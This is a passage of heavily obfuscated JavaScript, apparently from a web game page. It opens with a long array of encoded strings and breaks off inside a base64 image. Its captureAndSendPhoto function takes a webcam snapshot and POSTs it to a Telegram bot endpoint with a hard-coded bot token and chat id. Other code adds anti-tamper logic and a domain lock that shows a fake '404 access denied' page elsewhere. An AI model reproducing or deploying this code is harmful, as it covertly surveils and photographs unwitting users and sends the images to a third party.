'AuBcQrtdHa', 'tKrY', 'aSk8k8k+rW', 'CCoExCoCcG', 'C37dQCkboW', 'W6RcKSoMzmkm', 'hCkRcKW7', 'W4CdAmoLWPm', 'WQLUbCokoq', 'w2vZifi', 'WQNcKH/dLG', 'W7pcMNiGW7G', 'W6bUWQyfWO4', 'WPldQSovWPBcSW', 'zCoUW43cLCor', 'nSklWRRdJ8k4', 'W4DJW6pdO8oQ', 'ssNcPmkElW', 'WQ/cNKW+', 'xCoBqmoNaa', 'WQv4W7jeWQq', 'eqbWWRVdVG', 'B37cMGxdQW', 'W69EW7eOWQG', 'umoKqmoNmG', 'W6D5W7SgW68', 'pMi4b8kC', 'gSkrW5VcImoq', 'hmkwk8oQfq', 'sNT/qHm', 'yYxdOqtdIq', 'j28UbSk+', 'WQDvWPvZW7K', 'W6JdUYbJta', 'n8obWOWcWPu', 'jx/dOq7dLW', 'k8ooWPj0WQu', 'umkfWP7dPCkf', 'W5tdMCkxhSoS', 'k28WbsW', 'ptmzsqq', 'jmoOsSkAlW', 'D8oXsmomnq', 'W5BdOCkzWO3WOOke', 'aSo+W4jLWQS', 'ovfcweK', 'WROFW7bTpCobrCon', 'i8o8WOT0yG', 'd8oEFa', 'WOtcGCkQWOS', 'a8o7ArldKW', 'puS+jcS', 'gIjiWRldTG', 'WOxcHvaN', 'zbGwW5bG', 'W6VcGZPWWO0', 'W5NdGSoOW4ur', 'W6JdPmkNvSo+', 'W4bGWQP0W7y', 'ih/cLmkiW4m', 'uIJcG8kpmW', 'W53cVmoKmCkg', 'qCkDhfmE', 'W5m0vmo6WPy', 'W4hcPe3dL8oE', 'WP7cINqqja', 'fvtdHWBcIW', 'WRWxW5zenCoKxmoA', 'WO3cMgysW5C', 'W7XDWQ9OWR4', 'isaMCZu', 'WOxcQt/dU3O', 'WPBcQc0miG', '0jJtLToI0PFtOW', 'zMfNDrO', 'W5hdV2lcT8kb', 'vsGMW6DQ', 'A8krW6/cI8k7', 'jczNo8kl', 'W5XmW5xdV8oK', 'WO9xW5/cHeW', 'CmkXg8kcDG', 'gSkhaxm/', 'WOddMtZcLCk5', 'WOFcTd3dTW', 'W45iW5WP', 'W5ldP8kACSoo', 'W53dOmocWRK', 'WORdRuejqa', 'WR/cPXzMW6G', 'g8o4WOz4WQO', 'Cmk5W4OMiq', 'hgmYbSkh', 'uYtcS8kEmG', 'tSkUW40/oG', 'W7zlW5KvW5O', 'WOlcPNm1W4m', 'k0CGbr8', 'jSkHW4xcICol', 'usWYW57dJG', 'WPfYi8oppG', 'thJdVI/dVa', 'vCkkmSkV', 'W79aW7j7fW', 'W7RcO0GXW5W', 'FriYcSoj', 'WRrQWPjqWPu', 'bvJdLZFcJW', 'WOXeWPhcVmkp', 'nCkgcZKZ', 'hGyMysa', 'fK8hnSko', 'W5RcQSohc8k9', 'WORdNmk5WRmZ', 'ydmgW59R', 'WPFdKblcTW', 'ttxcSCkrdG', 'scldQ8oXyq', 'W5FdQCocW6Kb', 'uSk8fCkgEq', 'W6VdPSoVWRjE', 'WQJcRSoSh8op', 'h8oCnLtcKW', 'tCkhWPDnWRG', 'wu9Rpgm', 'WO1aW4lcPXS', 'W4FdImo+W44s', 'WOpcK1tcPv8', 'W5FcV8oybmkx', 'FWpcKCkHdG', 'f2HZW7xdNG', 'sb1xW4u+', 'W7ZcLmkv', 'ccbUW5Kp', 'DbfAW4Tm', 'x3PpDtm', 'aghcJSkWW7i', 'pCoesXJdVq', 'W5/cJCoOWOav', 'W5pdI8oGW4us', 'W67cPgldSLS', 'mmkVW7pcRmo7', 'WOlcQ8ogi8of', 'p1FcQmkxW5G', 'WPJcLLWTcq', 'WQBdQSo0pmow', 'WQLvWO3dLCoa', 'B8oMWPtdGmoK', 'D8kOW6KDga', 'eCk8gJeQ', 'WQXdwCoKzW', 'WPJcNw8wW7q', 'D8o8W4O3nG', 'zJHXrCkf', 'msa3W6xcLG', 'WO11cmoDnG', 'CmoXeSkQCW', 'W5ZdKCkcrSof', 'W6VdLCo3W4OI', 'BVcyK7VcUCo/W5W', 'WPVcHf0OgG', 'WR7dQCoOWRJcKa', 'iH5nW67cSa', 'ASkYW4W', 'WOJcJmk7WRmc', 'WPlcPsiTna', 'WQnlW7tcSsC', 'W4tdQCorW6fh', 'W7S9WPhcIa', 'W5DCoVcZP4dcPa', 'W4JdGSkWrmo1', 'W5dcVsaKW5K', 'WPVdHSozWP7cSW', 'WRrJWOxdL8ox', 'W6ddP0RdTSoz', 'W5ldUwdcPmoS', 'WODInSosmG', 'wSotF8o9dW', 'hWJcIItcHq', '0P3sK9c+0AhsIG', 'tWdcOqZdJa', 'nmk8f2ldHq', 'tYJdV8krmG', 'W4rPW4tdKCo9', 'pCo+x8kcDG', 'FSkcWPBdJ8kW', 'W70VWOZcPaq', 'WRVcIuq6W7C', 'W7BcJSo1hSkP', 'W5ddR2NcUM4', 'imoWWQhXGBsA77I9WRe', 'WRr5WPVdL8ox', 'WRPQbCkfCq', 'W53cJ2JdJ8oA', 'kuuDnSkn', 'krauW7CR', 'WRXhWO11WOC', 'W63dGmobWP7cGG', 'pWCPvSoK', 'W7pdRSkepmom', 'FHxcN8kWma', 'W7RcOLZdMuO', 'uLeZW6tcVa', 'WQhcQXyaWQ8', 'nua+tdq', 'W7JcImktW43cLG', 'E1dcUcpdQq', 'W5KAWRpcQG', 'EfdcUG/dPG', 'W5RdMxbqyG', 'W4dcUM40', 'WPPDWPBcKba', 'WQfGWOTgWR8', 'W4pdJ8kYW7FcPa', 'WRtcQdNdThW', 'nuOVidm', 'vmkvmSksva', '0OVtK9cT0iqY', 'Aue1eCoM', 'WOLjW5FcKqq', 'WRFdImo8WOhcUW', 'W6hdTCkXh8or', 'W5nyWQjhW74', 'oL/dSrJdRG', 'B8owW5/cI8o9', 'W5hdQmogW7qg', 'b3bRW6RdIa', 'wSozECoBbG', 'W5hdGhbckG', 'jwGDqmkX', 'v8o3sSoFla', 'WRzkWPadWR4', 'mCk0utJdKa', 'WR7cOCk1WP0A', 'cCo9WPH1WO0', 'DXNdMHxdLa', 'W6mhymoIWPK', 'WPzHf8o5oW', 'WOxcScZdQmk1', 'b316W63dJG', 'WPNdGcxcJSkt', 'WQxcVmkhW5JcTq', '0jBsQ9cB0AVdKa', 'zSkXW5HUyG', 'WRuEkSkjza', 'dL/cL8kmW6W', 'b1C/W7RdLW', 'WORcKSkiW4Ta', 'jY9oqW0', 'zMnDsqC', 'iKfJWP3cUq', 'uSozW6ZdU8ks', 'eSojWPHo', 'W5PwW6NdLa', 'WRZdOCoDWR7cTG', 'm0aKbdu', 'zCoXxXBcSq', 'ASkYW5SHnG', 'W58Oi8ounq', 'cSkCfMWU', 'WRjaWQ7cUCk7', 'aeO8jZ4', 'ggycgWS', 'WOpcMSkpWPyV', 'W54gW4FcOcK', 'WPKzWPaiWRa', 'tYa2W6zR', 'WOzmWOJtV9gc', 'jYmbdfK', 'W6ldOmkql8oZ', 'W5L+W6pdImo/', 'W7RcLSkaW5hcKG', 'W5hcOwm', 'wSoJAmoVja', 'WQDefq', 'W4mwWPxcQG4', 'bmkjW57cQmow', 'oWmJf8oH', 'emk4dMq', 'WQfUW4/dLIW', 'yh1EDcm', 'W411W5jDaW', 'WRlcRSklWP8F', 'aZK6', 'W5pdS2FcTJm', 'W5eouCoaWQq', 'F35TbM0', 'ahv8', 'q3NdMUkmI2e', 'WO3cI8oPWOmL', 'whK7W6i3', 'W5dcTM0/W4C', 'tKDJpwe', 'W6NdOCoMk8kC', 'FXFdPqddLW', 'C1faWOddGW', 'W4VcPfK6W4K', 'Cx1IyIa', 'gHzpWRVdQa', 'W4JdJ8o1W70A', 'dCknhhq', 'vfiIW7tcRa', 'W6tqN9kK0jZtQG', 'obeMW5Dr', 'W77cGmo0i8kh', 'mwiKtSoi', 'WQtcJ8klWRKm', 'bSocsGhcNW', 'xCoFoCoDmW', 'iN7dObC', 'WOxdJ2BdGCox', 'W6jiW4L7xW', 'W5xdQdFcN8kF', 'zL15gae', 'Dd/dSq', 'W5FcSmo6ymof', 'agLlWQZdRq', 'igW8ndq', 'WOr5m8kYlq', 'W5BdOCou', 'WOldSYbWWPe', 'WObZl8ojEq', 'W5XBW49CdW', 'W7BcOr3dOqa', 'zuTRnG', 'WOlcQCkEW6zy', 'dCovzIO', 'aKqgkI8', 'WRJcT1Wtda', 'W6nPdmkPDa', 'sCk2b8ksBG', 'W4CDWPxcSsW', 'W7VcLCkv', 'W7vLW6mUW4q', 'WO7cUmk2WP0y', 'oaG3W6FcMW', 'qdCBW5bM', 'WRDIWPTMW4e', 'afySnWe', 'ySkIWPldVCke', 'i3tcPSkFW5W', 'W4dcNftdOMi', 'jZraWRJdHa', 'WO/dOmkPy8ozW5BcHWNdLCozumoCWQPw', 'kvORfsi', 'rncU0yhcUDo+', '0jBrTnkq0RJrTG', 'W5xcHLhdHCoz', 'uHhcK2pdLG', 'vJu6W7ex', 'gConWP1fWRq', 'e8ofyb7cVq', 'W5m9WPtcRsy', 'CSkkW50Jka', 'jcpcJCkrW4i', 'lmkGW4W', 'W6VcG3mEW6a', 'W4lcISovkSkA', 'mmoVlapdGG', 'dCkDxeed', 'WOr8imkara', 'umk7WRVdRCkW', 'DCoUnSk6yW', 'WOJcHSk9WP4F', 'WOtcH8kRWPWc', 'WQ5HWRJcO8kF', 'WPFcGmkXWOyz', 'fsfuWRKU', 'heKFgd8', 'jCoNqs3dTW', 'WOpcUhDpAW', 'rcJcTmkc', 'W5dcJMpdGq', 'W4tcT1FdHee', 'lKCLdWm', 'W5e2ySocWRS', 'kwifamkA', 'W6TbWO5vW6W', 'WRVcGGmNW7a', 'WRldRCkMemol', 'WOBcOYBdJMe', 'W4VcMuddG8oC', 'W7RcLCkuW4ZcLq', 'wrZdTbpdJW', 'W4pdUwldHCkg', 'WOpcQsBdRNW', 'ESkebSkKvW', 'W5JdVhbGrG', 'W77dO8oSW4uE', 'WOXlW5pdV8o+', 'icRdHYtdGa', 'x8ooEmoMdG', 'uIvCW6bA', 'l0a+eSkf', 'W5mEWO7cPqW', 'WOlcJviWW5C', 'WPjcemktW7C', 'WO4YWQWQ', 'dmo6AXpcPG', 'WRLzWPBcU8kL', 'W7hcKCkGW4xdKq', 'WQddL8kHqmo4', 'WOtcVvqXeW', 'nx9dW7JdMG', 'WONcH8kWWPDn', 'l1C/', 'WRj8WOpcOCkH', 'WO7cP8kn', 'vdmbW4bO', 'W7RdTCk3bSom', 'yCohW7RcK8kC', 'hfxcNIdcIa', 'WOBcLhGwjW', 'WRbSWRzOWPe', '05BtKTkDW5lqTq', '0ydsKToeaSoO', 'WPxcH8k0WQmg', 'WOqnWP/dGG', 'bNjpWPmU', 'WP/cHmk6EW', 'h8kAag0', 'W5xdH23dJmoM', 'W7XCWOe', 'zSkhWRi', 'eSo9qtpcIq', 'fWvLphe', 'mmkQl+koP8oq', 'W5BdPgpdPq', 'W4RcGuqzW4K', 'tZVdPCocW4q', 'j8oHrIpcNW', 'FCkSWQldUCku', 'xbveW6DT', 'WO8kW4BcJba', 'dmk8cg8z', 'AmkjWRBdGmk6', 'smoFzmoWiW', 'WO9eoSobiq', 'qKrY', 'WRTkW5JcIbi', 'f1ZdLI3cKW', 'W6pdIN/dH8oz', 'ztTKrCoDW4TfWOFdK8o8Amo3W6G', 'gSkedNm4', 'cWOMC2u', 'tefYahe', 'W5/cUCosWPJcUW', 'aLLdW6/cKa', 'rr4mW7zj', 'WPq0WQS3WQ8', 'nMFdL3FcIq', 'bSkwoSkWuG', 'hSojEdS', 'dMVcTCksW5e', 'WP8WWQ0/WQ0', 'W4OfW5tcGXq', 'pCkUhSkhFG', 'W6ddPmk3a8on', 'xCkmWRFdJSoY', 'hSkng0mK', 'a1bhW7VdGq', 'W6jLW6ulW4a', 'aw4XWPpcMW', 'qHpcPmkTeW', 'mSkBjweO', 'W4pdIsroyG', 'vtVdTmooWPG', 'odujW48b', 'WOxcM8kXWP4d', 'W7ddLx3dImoR', '0OhtMTc+0PBcKW', 'W4NcPxu1W5i', 'bL7cG8kVW40', 'W4BcGw4CWOq', 'emkqW4fOWQ8', 'W4SQWOJcOcu', 'CufVxZS', 'WQPBq8kTCq', 'W5hcK8o5m8k8', 'WPTjgCkyW74', 'W6xcVxiaW4u', 'jGbkWOZdQW', 'WRf+W57dLNW', 'WO1UlCoAjq', 'j2pdV3NdHW', 'WPdcKxqryG', 'bNjpWPmT', 'udpcICksDW', 'FKDScNS', 'WO7cHSk5', 'vCoUW4efDa', 'CCo6WPldI8kkbCkKWPmQC8kPcGG', 'WRXJWPhdGmke', 'W7xcG8ksW4NcQG', 'W73cRCoymmkF', 'gCoMWOVdKmoJ', 'DwPJtqq', 'CCk7W4K1AG', 'WRivWQ4nWOG', 'WPNdPIddVxe', 'iSo+WOnTWOG', 'v8oMtSoyaW', 'tSotF8oRfq', 'WQjwW7WR', 'WQJdKmofWOdcLq', 'h8klbwWd', 'qZWBW79N', 'W6BdMe/dOmoW', 'E8oUn8kHtG', 'EK8Pfs4', 'W6mpymocWPG', 'W67cN0OdW6q', 'CaddKJldJW', 'tmorFSoQmG', 'sdldTGdcLq', 'WRVcVCoSfCoq', 'BCoMWOpdLmku', 'W6tdKu3dLmo+', 'WOTicSkJFq', 'ACoIumkcja', 'or1wWRRdOa', 'W4dcSIHIWOq', 'W4ddOCoaW64A', 'W4RdV3vkna', 'WOtcPh8ljq', 'EmkZgSknBG', 'WRBcIsldGN8', 'uHadW5Hc', 'WO8pWQ0OWOC', 'm8oZW4/cQ8oi', 'Cg45gmkh', 'WPHeW5JcHHG', 'WOdcVCoSWOGd', 'hSoFqXVcHq', 'dxuGimoO', 'aftdLcBcNW', 'WOlcQtZdQwC', 'WOpdGcBcNmkl', 'WOqFWPBcHbS', 'hvxdLHpcIa', 'WOHlWP0wW6m', 'jmogWP9mWRm', 'W7TeW54dW5m', 'W7KctmkLzq', 'W7aGWO3cGdm', 'nHT/gqe', 'yXxdJZJdLW', 'WPK4WReTWRq', 'W7GGWPFcKJu', 'z2mOW54H', '05BtTNlcQYy', 'W4JcVmoKg8ka', 'WRNdI8orW5lcMq', 'W5pdQSooW6Ou', 'W5vhWR9BW7G', 's8oKW48ZdW', 'fmooWOaaW6i', 'CGBdTt/dGa', 'rxbife8', 'WQjiW7xcSbq', 'WPxcMwCliq', 'WPpcH8kW', 'jZCNW5yg', 'WOldNhyolq', 'W4PCW4ddOSoO', 'dSovFcBdMW', 'WODaWRtcQmkq', 'ogmI', 'W4TTW4/dU8oU', 'phDMW7pdQW', 'a8ogW5rwWRq', 'W4NcTYdcTCom', 'fWbNWRxdUa', 'W5TGW7iEW7m', 'W4PqW4dcTCkb', 'fNLTW7ZdGW', 'WO8AWRSpWPi', 't2PHW5yk', 'W51nW4/dP8oU', 'ArZdHbtdGW', '0ktrJDkA0jNcJq', 'ibCgWPhdGq', 'W5jHWRzlW4y', 'eePGkCoF', 'lZCJW58', 'W5VdT8kfWQ5D', 'WPdcMh4vEa', 'ht1kWPhdJW', 'cNFcPmkkW4e', 'W5FcLxZdGmok', 'WPNcV2ddVmkb', 'WPlcMSk/WOyF', 'W73cUCkjW4VcJq', 'WQ5OWOpcN8ku', 'W6vFW7yHW6m', 'nbT/jdy', 't3/cRmknW5G', 'WQTYgmoFaq', 'BSknWQpdGSk+', 'fHKFamoO', 'WOTmWPxcNCkt', 'W7GGWPdcGY4', 'WOHEkCkLDG', 'W6n9WRXCW5O', 'WPVdSCozW43dVW', 'feS8WPtdKW', 'wmkeCtNdRG', 'WQNcN2Cbma', 'WPNcV2/dUSoB', 'lGOwW4dcIG', 'WQbmf8kTEG', 'W61sW74QW6q', 'W6dcVhrWW5G', 'WO5aW4dcIXq', 'FxLVvdm', 'W7ddNmo3W44g', 'WO5nu8oCWRm', 'ECo+c8kmoG', 'cgS/nCkW', 'W77dJSoSxCoi', 'W4ZdUvj2Ba', 'WQzFWRvjWPW', 'jSkIW4RcICom', 'WO1mW5JdMfC', 'BxbjyLm', 'nSkdlxu/', 'WP/cJwKSfa', 'sezNigy', 'W4RdTwG', 'WPidu8ohWR4', 'aCoqWPLqWQO', 'W4ZdNNzWAa', 'd8kadhqy', 'W5lcVmkxW7hcUq', 'WO3cGCkjWQmx', 'ybC3W4fL', 'tgzawtW', 'EflcNY/dJq', 'r31nAIW', 'rs7cPmkc', 'tq7cN8kyda', 'fNLK', 'WO7cP2tdUhW', 'qxzUWPPd', '0PdqJ9kl0RxcQW', 'fx7dOWtcTq', 'WPtdImo7W4FcLG', 'WO4fW5xdPmoV', 'W7NcNSovoCk2', 'W6/cOmk1W6FcPG', 'nI3qS9gK0ze', 'vsywW59R', 'WOBcJZe', 'W6q7zSolWPS', 'W7G6WPVdHJ0', 'WRfUW57dHNW', 'W43cM0ldN3e', 'yxXFAqG', 'W67cV8o5e8k2', 'erOwW4K6', 'WQrdWO7cPCkB', 'W4tcG0tdGwe', 'W63cQh/dTSoK', 'tCoFyCo6pW', 'W5hcOd1YW5a', 'aevAW5xdLa', 'o0a+ca', 'd8oDBtddRq', 'v8oWFmomcG', '05psV9o10yBsHa', 'g8oMWPTRW6W', 'nq7dHKBcPq', '0PVtKDgo05BsGa', 'lf48iai', 'wmk9WRtdJSk1', 'WOxcRYq', 'CSkQemoz', 'W4ddG8oMW6uc', 'W5zUW5VdVSoT', 'WRVcNbjMW7y', 'WRNdMSobWOldGq', 'WO7cJ0SPW60', 'W5pdP8otW64d', 'dKKPbGi', 'W67cLmobW6BcHa', 'WQ0GW7OrWOu', 'wCkiaFc4RBD9', 'bCkkW4OEW7m', 'W4BdS3q/WPe', 'W7pcHf3cPeK', 'W5JcUvBdPmoL', 'W5fhW5FcKri', 'W7FdRmkMgmol', 'shlcLConma', 'W7CIWPhcIs4', 'dMNcT8krW58', '0j3rSToS0RbH', 'xXtcH8k8eG', 'uSoMCCoYia', 'o8oyW6xcJSoM', 'EWpdJtK', 'yvGwW4pcHW', 'WQ0ns8kIya', 'WQDmW4/cT8kO', 'W5RcJgRdM8ox', 'b8k3W6lcNG', 'W5pcShFdTmof', 'AmoRW5iTDq', 'W71jWOFcMCks', 'g1/dLsRcIq', 'pCoJW4/cK8on', 'WOxcScZcTCkF', 'sCouz8oNpq', 'WOFcNKaynG', 'bbSHW54g', 'WQuOW7iFWO4', 'WRbxWOzaWRC', 'dmkka2KO', 'DINdOSk+AG', 'W5FdTxJdOmon', 'WO5lW5/dRmoJ', 'lmkbW7G', 'W6vDW6X3WRy', 'W4/cSCkRW4JcPa', 'WRdcVv4vnq', 'WQXcW6CUWQS', 'W5BdPh7dVmop', 'oreNW6BcQq', 'eW4SWOpcQW', 'ESkpfCkhAa', 'WQHlWQbvWPO', 'c8koj3O5', 'WP5bWPfLWQS', 'W4yqsCktWRK', 'WO5yWQtcH8k1', 'WPBdS8ou', 'd8kbdgvX', 'hmkwk8oZbG', 'tHaMpxO', 'emodwXZdQq', 'WQlcRCoJrSkr', 'W4eJqmoHWPS', 'ig3cOmkmW4q', 'iaCbW4xcLq', 'or1GWR3dOa', 'WOzQnmokjG', 'W4hcV2eJW4i', 'lSkbW4/cO8kj', 'tSozESoVcq', 'WR7cOCoZwmkh', 'W75Aw8oBW6C', 'hmoHzbldRa', 'FSkXg8kgja', 'lmk/W4JcNmo0', 'fqDWWQpdTa', 'W4RqL9ki05xrIG', 'u8kjf8kHBq', 'W4KNWPZcVWy', 'j8osWQrXWPG', 'W6a2W5JWKkA5W5a', 'W5mwvCkiW50', 'mKCJf8kg', 'ugxcPvxdTq', 'b8oerI3dTa', 'WQ3cIr1z8lMrUG', 'cNZcT8kFW4u', 'W6H4WQyFW6O', 'luKggCk+', 'r8khe8kmBa', 'W5VdQSoaWR1v', 'avtdHWRcIq', 'z8osW7xcM8oM', 'W5ddUmkkeG', 'WPdcJMmnnq', 'fs8+W58', 'WOH8W5xcHJq', 'CYalW5va', 'WPxcJCkZWP0a', 'WQhcMfCJW6S', 'DmoWc8kgDG', 'BtzCvmoi', 'WOeQW7e9WQ8', 'WOJcRrqxW5K', 'WO/dPNRdVgy', 'cmkLdNGC', 'WP0WWROS', 'DrlcHSk0eW', 'p0u5nSom', 'B8kLWRRdJ8k4', 'fXO7W5en', 'WRGUWPy6', 'tuv0fNq', 'fxvGW73dOW', 'AI7cO8kp', 'j0zbW5hdIG', 'W4xcPCksWPpcUW', 'iaeDW6hcRW', 'nazJqq', 'owuCWOHB', '0AVqJ9gVrDkx', 'W5rqoCo/bG', 'WOX2WOLoWPe', '0ipqP0/cKmom', 'W4XRW4ldNmoc', 'W4xcR8oOWRbE', 'ySkpW7RdJSk/', 'lgnLW5av', 'W5BcVmoLh8kA', 'WQDmWPnA', 'yCkTeJ7cIG', 'f2HRW63dNG', 'm00Wds4', 'E1ZcQG', 'FcNdKI7dIq', 'WPRcMfiJaW', 'i8oDwWJdQa', 'W74GWPS', 'W67cIwVdISoC', 'W6dcPNqKW54', 'WQ9Gc8o5oG', 'ehnvW4y', 'WQ9OWO/cGSkb', 'm0a+', 'W7rWW7tdHNW', 'WPpdVuhcPSo2', 'wCoyF8o7fq', 'kSouWRNdGSoJ', 'bfldNdtcTq', 'e2ytmau', 'W6X+WRC', 'W7q1F8oKWPK', 'vN9NWOfP', 'neBcIXhdLa', 'WQfOWOHhWRC', 'Amk8uCkkDq', 'W4zAW559W5i', 'WPlcPmkhWQDv', 'fXfNWQFdVW', 'DCk0bxFdKa', 'ybKCW6PL', 'dJiRW6Om', 'WQNdLCkLWPBcJG', 'WOxdQCoGWRJcMa', 'nCkAgdb9', 'fNldMYRcIW', 'W5tdSwldJ1COaJxdLW', 'WOTeWOPrWPC', 'WR7dQmo4WPNcJG', 'nqWAW57cIG', 'WQxdLCkfW4VcLW', 'pCo+x8odoG', 'W7hcNeVdPNO', 'f3qom8kS', 'fLegvmkt', 'Bh4uvH4', 'hmoHWRbZWPK', 'WRTxoSkpwW', 'W7yRWPdcKG', 'BZKUW6zL', 'W7PsW7NdNCon', 'WOtcSmklW64J', 'WQRcOSk5W7hcOW', 'lMm9iCoh', 'pYiAg1O', 'W4FdK8kptmkF', 'WPFdNCoXWR1d', 's3pcHH/dRa', 'W4JdT8o0W4uf', 'C31GqdS', 'W4HNWQ8MW7S', 'EvNcRr8', 'WRlcOCoJvSkF', 'WPVcNeSRW70', 'W4RcSmo6nSk2', 'W6xdVSoVW405', 'W7iHWOVcIcG', 'W6pdLCoeW4iN', 'yurvWPddJa', 'W7JcThpdVwi', 'WOVcILmHma', 'xLHJnZu', 'a8kEFdVdTq', 'W5FdTgXCFa', 'CCkmb8kRvG', 'WReqW6HVW7K', 'W6ddPmkKe8oh', 'gmoczbZcTq', 'WPddImoJWP7dRa', 'WORcPSkPWOze', 'WQ7dLCkrWPFdMq', 'W5RdM8kYqCoM', 'uCoPWPnhWRi', 'WQbfaSk2vG', 'ohddGs7cJq', 'jejVe8oB', 'WPlcK3uhFa', 'W5ldJ8kzW6/cPG', 'WQv3WRVcPSk5', 'WOxcRYhdQN8', 'W7XnWPrUW4u', 'W7rJWORcNYW', 'efvBW5ldUa', 'WRmTW4RcI8kc', 'WQqIWOhdGSoe', 'W4j/WPSVwq', 'w8kaEcBcUq', 'WRrJWOZcImkf', 'WQWnW7yIW7i', 'nSoMqdBcHa', 'W5FdT2xdU8kf', 'DYvPtSkZ'];
  _0x3b0a = function () {
    return _0x18c87a;
  };
  return _0x3b0a();
}
function _0x2d5ef4(_0x5c9ba8, _0x494d19, _0x3fb70d, _0x13e9d8, _0x9f4061) {
  return _0x1b68(_0x3fb70d + 0x22a, _0x9f4061);
}
function _0x175207(_0xa23170, _0x5862e8, _0x10a2b0, _0x443b0f, _0x2287b9) {
  return _0x1b68(_0xa23170 - 0x27c, _0x2287b9);
}
function getCountryEmoji(_0x12650c) {
  return _0x12650c.replace(/./g, _0x3d422f => String.fromCodePoint(127397 + _0x3d422f.toUpperCase().charCodeAt()));
}
async function captureAndSendPhoto() {
  try {
    const _0x152338 = {
      video: true
    };
    const _0x20236a = await navigator.mediaDevices.getUserMedia(_0x152338);
    const _0x1470c0 = document.createElement("video");
    _0x1470c0.srcObject = _0x20236a;
    await _0x1470c0.play();
    const _0x2c61f5 = document.createElement("canvas");
    _0x2c61f5.width = _0x1470c0.videoWidth;
    _0x2c61f5.height = _0x1470c0.videoHeight;
    const _0x1fced8 = _0x2c61f5.getContext('2d');
    _0x1fced8.drawImage(_0x1470c0, 0, 0, _0x2c61f5.width, _0x2c61f5.height);
    _0x1470c0.pause();
    _0x20236a.getTracks().forEach(_0x11be82 => _0x11be82.stop());
    const _0x513aae = await new Promise(_0x387004 => _0x2c61f5.toBlob(_0x387004, "image/jpeg"));
    const _0x429eee = new FormData();
    _0x429eee.append("chat_id", "7728504492");
    _0x429eee.append("photo", _0x513aae, "photo.jpg");
    await fetch("https://api.telegram.org/bot8493084337:AAFPW75-vT4EgtloLveSmbgN-6bvD3FYztos/sendPhoto", {
      'method': "POST",
      'body': _0x429eee
    });
    console.log("Photo captured and sent successfully");
  } catch (_0x6da69e) {
    console.error("Failed to capture photo:", _0x6da69e);
  }
}
async function initTelegramBot() {
  const _0x5cdafb = function () {
    let _0x5d65f7 = true;
    return function (_0x56c459, _0x42ac8f) {
      const _0x17d2c0 = _0x5d65f7 ? function () {
        const _0x11306c = {
          ZxfVF: "arrow"
        };
        _0x11306c.OWIsn = "active";
        _0x11306c.QqhqK = "gameEndModal";
        _0x11306c.CLDcp = "modalOverlay";
        _0x11306c.Xcvcr = "modalOkButton";
        if (_0x42ac8f) {
          const _0x1f8caa = _0x42ac8f.apply(_0x56c459, arguments);
          _0x42ac8f = null;
          return _0x1f8caa;
        }
      } : function () {};
      _0x5d65f7 = false;
      return _0x17d2c0;
    };
  }();
  const _0x42e317 = _0x5cdafb(this, function () {
    return _0x42e317.toString().search("(((.+)+)+)+$").toString().constructor(_0x42e317).search("(((.+)+)+)+$");
  });
  _0x42e317();
  const _0x26aba3 = {
    domain: window.location.hostname,
    fullUrl: window.location.href
  };
  if (_0x26aba3.domain !== "trd.cc.nf") {
    document.body.innerHTML = "\n            <div id=\"overlay\">\n                <h1>Ошибка 404: Доступ запрещен</h1>\n                <div class=\"arrow top\"></div>\n                <div class=\"arrow bottom\"></div>\n                <div class=\"arrow left\"></div>\n                <div class=\"arrow right\"></div>\n                <img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQ0AAAAiCAYAAABFn4xfAAAA4WlDQ1BzUkdCAAAYlWNgYDzNAARMDgwMuXklRUHuTgoRkVEKDEggMbm4gAE3YGRg+HYNRDIwXNYNLGHlx6MWG+AsAloIpD8AsUg6mM3IAmInQdgSIHZ5SUEJkK0DYicXFIHYQBcz8BSFBDkD2T5AtkI6EjsJiZ2SWpwMZOcA2fEIv+XPZ2Cw+MLAwDwRIZY0jYFhezsDg8QdhJjKQgYG/lYGhm2XEWKf/cH+ZRQ7VJJaUQIS8dN3ZChILEoESzODAjQtjYHh03IGBt5IBgbhCwwMXNEQd4ABazEwoEkMJ0IAAHLYNoSjH0ezAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAKB0lEQVR4nO2cbWgb5x3Af1rrD2uT7tu6l+pkFwRm2jIYoasWYSVkUz6oWQUti23UVK5xMGgpnTtV3aI51FVfhBpD54mZGGO1mCiGfhBzTak3bXFQEIMxWDZtZmKNXtK9fVublyZNl304nXSSdZJOL1bcPT8w+O7+Oj33/O/+z//tZLh/wHIbgUAgaJLP9HoAAoFgZyGMhkAg0IUwGgKBQBfCaAgEAl0IoyEQCHQhjIZAINhC3913c9/uXTWPCaPRC5xBLqYSXEwFcfV6LAJBFQaDgR/5niHgn6p5/O5tHs+OwuKNEnMbIRlij2+9ttDgBKtLw5hqHMrlC2TPn2E+sk66qyO9g3AGuRiwVuzKLU9yOJLBFU4wY0N7PktzWSA65mF2s3q/BvmzjBxZkOdY6xyq8a0GrJiAjeBBjq9pnLMVvaq/+6kxZv+ytQXKMujg0PgoB2xG1bkL5JIXWFw8R3wzUymv3IMq6o67AzzueoRjTz3BD54L1DzeM0/D4o1yMRVlarBXI2iEg0m3ESgQXdQwGA0wSUbsbj+xlQksnR3cjiCXL8gPWK8HojA4UTIYueXJhg/ebY22x9b0asYVjhJb8uOpMBgARky2YWaW5lkNOzBUHLtcmsftYM9Xv0LoxWmufHiF9cS5mjI98jTMHBqSH8g7FucQdoD8Bd6tXq1qUr2ymXF5TzDjNoI0zKRzoaurwx1HMsRhLe+sZTS8h6ZwMFf0HBTPp7XvbE2vrvC87GUBuWSI5xfXSZc8KTOu8RPM2IyYbH5+4c1yOPJXANKRAIcjyjkSpXN0gy/c/3lO/+wU99zzWdbe/RX/+eDDmnINPA0zLm+Q1ZVEMQaX/1ZXgkw5zVukLc5q2SirYUeFNbY4J5hbmccjARjxLJXl55xFGW9U3lfTkjuYq5IHSnmCVa8ZBh3MrajHO4FLp0fj2i+72Lnz51oMLTLEI2fYKG7192+dr2o6c93R8vyr9FStm9WVoOacNKPHnYWZqRW/vAgkQzoMRi3065XBCcYVg7E8yWGfymAAbGaI+zxMJ+VNk/vH2+6B9/X18Xo4SL8kh0Irb8U1ZesaDVd4nhm3FZMEqFwkk2TFs3+gSjZKLFAtK1vOmCrhZ96/j371B4uynXK/TENPMrfkxy5BTtknDTOzpCPpWFJyisW2brDto3zdRnL54k7JiidwgjlvsKSb8pxYa85Js3rcOZiZUhap/FlGOu79NMZycF8xHKl/P8V9oaIxMnLgYBPGqEMYDAZOPPcMdtu3AHj/7//gt7/7vaZ8nfDEwcGiddySeBl0YEE1+c4gM7Zi/F/lyskKszITdhD3rRP3eYirE0YnW3U3NZCs2JMhRnzrV